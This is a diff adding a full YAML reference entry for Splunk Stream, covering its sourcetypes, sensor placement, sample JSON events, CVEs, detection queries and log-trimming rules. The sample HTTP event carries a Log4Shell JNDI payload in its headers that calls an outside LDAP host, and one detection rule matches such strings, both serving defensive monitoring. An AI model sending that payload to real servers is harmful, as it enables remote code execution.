@@ -2,11 +2,332 @@
 id: splunk-stream
 name: Splunk Stream
 short: Splunk Stream
+aka:
+  - Splunk App for Stream
+  - Splunk Add-on for Stream Forwarders (Splunk_TA_stream)
+  - streamfwd
+  - Independent Stream Forwarder (ISF)
 vendor: Splunk (Cisco)
 category: ndr
-status: stub
-summary: Wire-data capture forwarder that decodes protocols into JSON events (IP, TCP, HTTP, DNS …).
+status: full
+updated: "2026-11-12"
+contributors:
+  - wlinde
+tags:
+  - wire-data
+  - packet-capture
+  - dpi
+  - json
+  - http
+  - dns
+  - netflow
+summary: Splunk's wire-data collector. The streamfwd binary sniffs packets from a NIC, SPAN port or tap, reassembles sessions, decodes 30+ protocols with deep packet inspection and sends one JSON event per flow or transaction (stream:tcp, stream:http, stream:dns …) to Splunk. It can also receive NetFlow/IPFIX/sFlow and write targeted pcaps.
 sourcetypes:
   - st: stream_http
+    desc: HTTP transactions — method, URI, status, headers, user agent, timing, bytes
   - st: stream_ip
+    desc: IP-layer flows for non-TCP/UDP or aggregated traffic — addresses, protoid, bytes, packets
   - st: stream_tcp
+    desc: TCP flow records with byte/packet counts, timing, TLS certificate fields and detected app
+  - st: stream:http
+    desc: Native Splunk sourcetype for HTTP stream events
+  - st: stream:ip
+    desc: Native Splunk sourcetype for IP stream events
+  - st: stream:tcp
+    desc: Native Splunk sourcetype for TCP stream events
+  - st: stream:udp
+    desc: UDP flow records (same field model as stream:tcp)
+  - st: stream:dns
+    desc: DNS queries and responses (query, query_type, reply_code, answers)
+  - st: stream:netflow
+    desc: NetFlow v5/v9, IPFIX and sFlow records received by streamfwd
+facts:
+  First released: 2014 (Splunk App for Stream 6.x); current line 8.x
+  Platform: streamfwd on Linux (x86_64), Windows; runs inside a Universal Forwarder or as an Independent Stream Forwarder
+  Delivery model: Free Splunk app (Splunkbase) + forwarder add-on; managed centrally from the Stream app on a search head
+  Deployment modes: Passive capture (SPAN / tap / promiscuous NIC), local capture on a server, flow ingestion (NetFlow/IPFIX/sFlow), targeted packet capture to pcap
+  Log transport: Splunk-to-Splunk via the Universal Forwarder, or HTTP Event Collector (ISF)
+  Log format: JSON, one object per flow or transaction; sourcetype = stream:<protocol>
+  Protocols: 30+ decoded (HTTP, DNS, TCP, UDP, IP, SMB, SMTP, FTP, LDAP, MySQL, TDS, TNS, SIP, DHCP …) plus detection-only app classification
+  Typical volume: Similar to Zeek — thousands to 100k+ events/s per 10 Gbps sensor; stream:tcp/udp usually dominate
+  Cribl Pack: none verified in the Packs Dispensary
+placement:
+  slots:
+    - dmz
+    - internal
+    - cloud
+    - endpoint
+  items:
+    - slot: dmz
+      title: Perimeter SPAN / tap
+      desc: A dedicated sensor on a SPAN or tap behind the firewall sees all north-south HTTP, DNS and TLS traffic to and from published services.
+    - slot: internal
+      title: Data-center core
+      desc: Sensors on core or aggregation switches capture east-west traffic between application tiers and databases (SMB, TDS, MySQL, LDAP).
+    - slot: cloud
+      title: Cloud traffic mirroring
+      desc: An ISF instance receives AWS VPC Traffic Mirroring / Azure vTAP feeds, or NetFlow/IPFIX from cloud routers.
+    - slot: endpoint
+      title: On-host capture
+      desc: streamfwd inside a Universal Forwarder captures only that server's own traffic — useful where no SPAN is available, at the cost of CPU on the host.
+howItWorks:
+  - title: Capture
+    body: streamfwd reads packets with libpcap or an AF_PACKET ring from one or more interfaces. BPF filters and per-stream IP/port filters reduce what is processed. Without enough CPU it drops packets, and those are lost silently unless you watch its metrics.
+  - title: Reassembly and protocol detection
+    body: TCP sessions are reassembled and each flow is classified by content, not port (app field, e.g. app=tor or app=ssl on 8443). protocol_stack shows the decoded layers, e.g. ip:tcp:http or ip:tcp:ssl.
+  - title: Protocol decoders
+    body: For protocols enabled for field extraction, decoders turn the payload into fields — HTTP method/URI/status/headers, DNS query/answer, SMB file names, SQL query text. Each stream config chooses which fields to emit, so the field set depends on how the stream is configured.
+  - title: Aggregation and sampling
+    body: Streams can emit raw per-transaction events or aggregated events (e.g. sum of bytes per src/dest per interval), and can be sampled. Aggregated streams cut volume a lot but lose per-session detail.
+  - title: Central configuration
+    body: The Stream app on a search head is the control plane. Forwarders poll it over HTTPS for stream definitions, so a change in the UI changes what every sensor collects.
+traffic:
+  handles:
+    - IPv4/IPv6, TCP, UDP, ICMP flows
+    - HTTP/1.x transactions (headers, URIs, status)
+    - DNS queries and responses
+    - TLS metadata (certificate subject/issuer, version) — no decryption
+    - SMB, LDAP, Kerberos-adjacent and database protocols (TDS, TNS, MySQL)
+    - Email protocols (SMTP, POP3, IMAP)
+    - NetFlow v5/v9, IPFIX, sFlow ingestion
+  flow:
+    - step: Mirror
+      desc: SPAN, tap or traffic-mirror sends a copy of packets to the sensor NIC.
+    - step: Capture
+      desc: streamfwd reads packets, applies BPF and stream filters.
+    - step: Reassemble
+      desc: TCP sessions are rebuilt; the application protocol is detected from payload.
+    - step: Decode
+      desc: Enabled decoders extract protocol fields per transaction.
+    - step: Build event
+      desc: One JSON event per flow / transaction (or per aggregation interval), sourcetype stream:<protocol>.
+    - step: Forward
+      desc: Sent to Splunk indexers via the Universal Forwarder or HEC — or to Cribl Stream as an HEC / Splunk-to-Splunk destination.
+logs:
+  - type: TCP flow
+    sourcetype: stream_tcp
+    format: json
+    share: 40–60 %
+    avg: ~1 KB
+    desc: One record per TCP session (or per interval for long sessions) with bytes and packets in each direction, timing, the detected application and TLS certificate details when the session was encrypted.
+    key:
+      - src_ip
+      - dest_ip
+      - dest_port
+      - app
+      - bytes_in
+      - bytes_out
+      - ssl_commonname
+      - time_taken
+    noise:
+      - src_mac
+      - dest_mac
+      - ack_packets_in
+      - ack_packets_out
+      - duplicate_packets_in
+      - duplicate_packets_out
+      - missing_packets_in
+      - missing_packets_out
+      - capture_hostname
+    sample: '{"endtime":"2026-11-12T09:14:52.118337Z","timestamp":"2026-11-12T09:14:22.418203Z","app":"ssl","bytes":48213,"bytes_in":3120,"bytes_out":45093,"capture_hostname":"stream-sensor-01","dest_ip":"203.0.113.80","dest_mac":"00:1A:2B:3C:4D:5E","dest_port":443,"duplicate_packets_in":0,"duplicate_packets_out":0,"missing_packets_in":0,"missing_packets_out":0,"ack_packets_in":31,"ack_packets_out":12,"data_packets_in":9,"data_packets_out":34,"packets_in":40,"packets_out":46,"protocol_stack":"ip:tcp:ssl","src_ip":"10.20.30.44","src_mac":"00:50:56:AA:BB:CC","src_port":51544,"ssl_commonname":"www.example.com","ssl_issuer":"Example Trust CA","ssl_version":"TLS1.3","time_taken":29700134,"transport":"tcp","network_interface":"ens224"}'
+  - type: HTTP transaction
+    sourcetype: stream_http
+    format: json
+    share: 15–30 %
+    avg: ~2 KB (more with full headers)
+    desc: One record per request/response pair. src_headers/dest_headers carry the raw header block when enabled — the most valuable and most expensive fields.
+    key:
+      - src_ip
+      - dest_ip
+      - http_method
+      - uri_path
+      - status
+      - http_user_agent
+      - site
+      - bytes_out
+    noise:
+      - src_mac
+      - dest_mac
+      - dest_headers
+      - flow_id
+      - protocol_stack
+    sample: '{"endtime":"2026-11-12T09:16:40.553018Z","timestamp":"2026-11-12T09:16:40.507391Z","bytes":2000,"bytes_in":291,"bytes_out":1709,"dest_headers":"HTTP/1.1 400 Bad Request\r\nServer: nginx\r\nContent-Length: 1545\r\n\r\n","dest_ip":"10.0.1.16","dest_mac":"02:3C:5A:F1:02:C5","dest_port":8080,"flow_id":"db81d2cb-b684-4fac-bb2e-82f355e6de6e","http_comment":"HTTP/1.1 400 Bad Request","http_content_length":1545,"http_method":"GET","http_user_agent":"${jndi:ldap://198.51.100.77:1389/a}","packets_in":5,"packets_out":4,"protocol_stack":"ip:tcp:http","site":"app.example.com","src_headers":"GET / HTTP/1.1\r\nHost: app.example.com\r\nUser-Agent: ${jndi:ldap://198.51.100.77:1389/a}\r\nX-Api-Version: ${jndi:ldap://198.51.100.77:1389/a}\r\nAccept: */*\r\n\r\n","src_ip":"198.51.100.23","src_mac":"02:95:98:C5:52:71","src_port":41132,"status":400,"time_taken":45627,"transport":"tcp","uri":"/","uri_path":"/"}'
+  - type: IP flow
+    sourcetype: stream_ip
+    format: json
+    share: 5–20 %
+    avg: ~500 B
+    desc: IP-layer flow for traffic not decoded higher up (ICMP, GRE, ESP …) or when only the IP stream is enabled. protoid is the IP protocol number.
+    key:
+      - src_ip
+      - dest_ip
+      - protoid
+      - app
+      - bytes_in
+      - bytes_out
+    noise:
+      - src_mac
+      - dest_mac
+      - capture_hostname
+      - network_interface
+    sample: '{"endtime":"2026-11-12T09:18:05.004211Z","timestamp":"2026-11-12T09:17:05.002118Z","app":"icmp","bytes":98304,"bytes_in":49152,"bytes_out":49152,"capture_hostname":"stream-sensor-01","dest_ip":"203.0.113.200","dest_mac":"00:1A:2B:3C:4D:5E","network_interface":"ens224","packets_in":96,"packets_out":96,"protoid":1,"protocol_stack":"ip:icmp","src_ip":"10.20.30.61","src_mac":"00:50:56:AA:BB:DD"}'
+cves:
+  - id: CVE-2023-32713
+    cvss: 9.9
+    year: 2023
+    kev: false
+    scope: device
+    title: Local privilege escalation to root via the streamfwd process (NVD 9.9; Splunk rates it 7.8)
+    affected: Splunk App for Stream below 8.1.1
+    fixed: 8.1.1
+    detect: Not visible in stream events. On the host — Linux audit or EDR showing streamfwd spawning shells or writing outside its install directory; non-admin users executing streamfwd.
+    avoid: Upgrade the app and add-on to 8.1.1+; install as a privileged user; restrict who can execute streamfwd; run sensors on dedicated hosts.
+  - id: CVE-2026-20253
+    cvss: 9.8
+    year: 2026
+    kev: true
+    scope: device
+    title: Splunk Enterprise unauthenticated file create/truncate via the PostgreSQL sidecar endpoint — the platform the Stream app runs on (CNA score)
+    affected: Splunk Enterprise 10.0 before 10.0.7 and 10.2 before 10.2.4 (9.4 and earlier not affected)
+    fixed: 10.0.7, 10.2.4
+    detect: stream:tcp / stream:http events to the Splunk search head or indexers from unexpected sources on sidecar ports; new or truncated files on Splunk hosts; Splunk _internal errors from the sidecar service.
+    avoid: Upgrade; disable the PostgreSQL sidecar service if not used; never expose Splunk management ports to untrusted networks.
+  - id: CVE-2021-44228
+    cvss: 10
+    year: 2021
+    kev: true
+    scope: traffic
+    title: Log4Shell — JNDI lookup RCE in Apache Log4j, delivered in HTTP headers that Stream records
+    affected: Apache Log4j 2.0-beta9 through 2.14.1 in Java applications behind the sensor
+    fixed: Log4j 2.17.1 (2.12.4 for Java 7, 2.3.2 for Java 6)
+    detect: "stream:http with ${jndi: (or obfuscated ${${lower:j}ndi:) in http_user_agent, uri or src_headers; followed by stream:tcp from the victim server to the LDAP/RMI host named in the string (ports 389, 1389, 1099)."
+    avoid: Patch Log4j; block egress from servers to the internet; WAF rules on JNDI patterns.
+  - id: CVE-2020-1350
+    cvss: 10
+    year: 2020
+    kev: true
+    scope: traffic
+    title: SIGRed — wormable Windows DNS Server RCE via oversized SIG records over TCP
+    affected: Windows Server 2008 SP2 through 2019 and 1903/1909/2004 Server Core running the DNS role
+    detect: stream:dns / stream:tcp showing DNS over TCP (dest_port 53, transport tcp) responses larger than 64 KB to a Windows DNS server; SIG (type 24) answers from external resolvers.
+    avoid: Install the July 2020 updates; registry workaround TcpReceivePacketSize = 0xFF00; restrict which servers may forward to external resolvers.
+detections:
+  - title: Log4Shell / JNDI injection strings in HTTP
+    severity: critical
+    signals:
+      - stream:http
+      - "${jndi: in user agent, URI or headers"
+      - followed by outbound LDAP/RMI from the target
+    why: Exploitation attempts against Java apps carry the payload in plain text, and Stream sees it even when the app logs nothing.
+    kql: |-
+      dataset="splunk_stream" sourcetype="stream:http"
+      | where http_user_agent contains "${jndi" or uri contains "${jndi" or src_headers contains "${jndi" or src_headers matches regex "\\$\\{\\$\\{(lower|upper)"
+      | summarize hits=count(), first=min(_time) by src_ip, dest_ip, site
+    mitre:
+      - T1190
+  - title: Tor or tunnelling app on a web port
+    severity: high
+    signals:
+      - stream:tcp
+      - app = tor, ssh or openvpn
+      - dest_port 443 or 80
+    why: Content-based detection disagrees with the port. This is typical of C2 channels and policy evasion.
+    kql: |-
+      dataset="splunk_stream" sourcetype="stream:tcp"
+      | where app in ("tor","ssh","openvpn") and dest_port in (80, 443)
+      | summarize sessions=count(), bytes=sum(bytes) by src_ip, dest_ip, app
+    mitre:
+      - T1090.003
+      - T1572
+  - title: Large upload from an internal host to an external IP
+    severity: high
+    signals:
+      - stream:tcp
+      - src_ip internal, dest_ip external
+      - bytes_in (client → server) above baseline
+    why: In Stream, bytes_in is what the client sent. A workstation sending gigabytes to a new external host is a classic exfiltration pattern.
+    kql: |-
+      dataset="splunk_stream" sourcetype="stream:tcp"
+      | where ipv4_is_private(src_ip) and not(ipv4_is_private(dest_ip))
+      | summarize sent=sum(bytes_in), sessions=count() by src_ip, dest_ip, ssl_commonname, bin(_time, 1h)
+      | where sent > 1073741824
+    mitre:
+      - T1048
+      - T1567
+  - title: TLS to a certificate with an empty or self-signed subject
+    severity: medium
+    signals:
+      - stream:tcp app = ssl
+      - ssl_issuer equals ssl_commonname, or is empty
+      - destination outside the corporate allow-list
+    why: Commodity C2 frameworks often use self-signed or default certificates. The certificate is visible in the handshake even without decryption.
+    kql: |-
+      dataset="splunk_stream" sourcetype="stream:tcp" app="ssl"
+      | where isempty(ssl_issuer) or ssl_issuer == ssl_commonname
+      | where not(ipv4_is_private(dest_ip))
+      | summarize sessions=count(), hosts=dcount(src_ip) by dest_ip, ssl_commonname, ssl_issuer
+    mitre:
+      - T1573.002
+      - T1071.001
+  - title: ICMP with large payloads (possible tunnelling)
+    severity: medium
+    signals:
+      - stream:ip
+      - protoid = 1
+      - high bytes per packet to one external host
+    why: Normal ping uses tiny packets. Sustained ICMP at hundreds of bytes per packet to a single host suggests an ICMP tunnel.
+    kql: |-
+      dataset="splunk_stream" sourcetype="stream:ip" protoid=1
+      | extend bpp = bytes / (packets_in + packets_out)
+      | where bpp > 400 and not(ipv4_is_private(dest_ip))
+      | summarize bytes=sum(bytes) by src_ip, dest_ip, bin(_time, 15m)
+    mitre:
+      - T1095
+optimizations:
+  - title: Turn off unused fields at the sensor, then trim in Stream
+    saving: 20–40 %
+    fn: Eval
+    how: Disable src_content/dest_content and header capture in the Stream app where not needed. In Cribl, remove MAC addresses, ack/duplicate/missing packet counters, capture_hostname and network_interface — they are useful for sensor health, not detection.
+    expr: "remove: src_mac, dest_mac, ack_packets_*, duplicate_packets_*, missing_packets_*, capture_hostname, network_interface"
+  - title: Truncate raw HTTP headers
+    saving: 15–35 % of stream:http
+    fn: Eval
+    how: Keep src_headers (attack strings live there) but cap it at 1–2 KB; drop dest_headers except for error status codes.
+    expr: "src_headers = src_headers && src_headers.substring(0, 2048); dest_headers = status >= 400 ? dest_headers : undefined"
+  - title: Aggregate internal TCP/UDP flows
+    saving: 30–60 % of stream:tcp
+    fn: Aggregations
+    how: East-west flows between known servers (backups, DB replication, monitoring) are repetitive. Roll up to bytes/sessions per src/dest/port/app per minute and send the raw records to Cribl Lake.
+    expr: ipv4_is_private(src_ip) && ipv4_is_private(dest_ip) && sourcetype=='stream:tcp'
+  - title: Drop stream:ip duplicates of TCP/UDP flows
+    saving: 5–20 %
+    fn: Drop
+    how: When both ip and tcp/udp streams are on, every TCP/UDP session is counted twice. Keep stream:ip only for non-TCP/UDP protocols.
+    expr: sourcetype=='stream:ip' && (protoid==6 || protoid==17)
+  - title: Route by protocol
+    saving: SIEM licence
+    fn: Routes
+    how: stream:http, stream:dns and external stream:tcp go to the SIEM. Internal flows and aggregates go to Lake for replay and hunting.
+    expr: sourcetype in ('stream:http','stream:dns') || !ipv4_is_private(dest_ip) → SIEM  |  else → Lake
+references:
+  - title: Splunk Stream — Supported protocols
+    url: https://help.splunk.com/splunk-cloud-platform/collect-stream-data/install-and-configure-splunk-stream/8.0/protocols/supported-protocols
+  - title: Splunk Stream — Simple Transport (IP/TCP/UDP field reference)
+    url: https://help.splunk.com/en/data-management/collect-stream-data/install-and-configure-splunk-stream/8.1/protocols/simple-transport
+  - title: Splunk Stream — search syntax (source / sourcetype naming)
+    url: https://help.splunk.com/en/data-management/collect-stream-data/install-and-configure-splunk-stream/8.1/reference/splunk-stream-search-syntax
+  - title: SVD-2023-0607 — streamfwd local privilege escalation (CVE-2023-32713)
+    url: https://advisory.splunk.com/advisories/SVD-2023-0607
+  - title: SVD-2026-0603 — Splunk Enterprise PostgreSQL sidecar (CVE-2026-20253)
+    url: https://advisory.splunk.com/advisories/SVD-2026-0603
+  - title: Splunk Security Content — Splunk Stream IP data source
+    url: https://research.splunk.com/sources/c96f5906-f601-4f32-a26c-482535159bc2/
+  - title: CISA Known Exploited Vulnerabilities catalog
+    url: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+related:
+  - zeek
+  - corelight
+  - suricata
+  - splunk-enterprise
+  - netflow
+  - log4j
